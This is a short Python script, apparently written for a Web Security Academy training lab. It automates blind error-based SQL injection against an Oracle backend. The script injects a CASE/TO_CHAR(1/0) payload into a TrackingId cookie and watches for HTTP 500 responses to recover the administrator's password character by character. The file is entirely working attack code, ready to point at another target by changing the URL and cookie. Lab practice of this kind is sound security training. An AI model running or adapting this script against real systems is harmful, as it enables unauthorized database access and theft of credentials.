#!/usr/bin/env python

# TODO: to improve the script use async/await

import requests
import string

# change those to current instance
url = "https://ac9d1fa51ee1e44ec0bb3344003a00e6.web-security-academy.net/"
cookie = "TrackingId=8FVKynKz6yxOPcJT"

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
passwd = ""

try:
    for i in range(1, 21):
        for c in characters:
            vector = f"'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            payload = f"{cookie}{vector}"
            headers = {'cookie': payload}
            r = requests.get(url, headers=headers)

            if r.status_code == 500:
                passwd += c
                print(passwd)
                break
except:
    print("exception err")
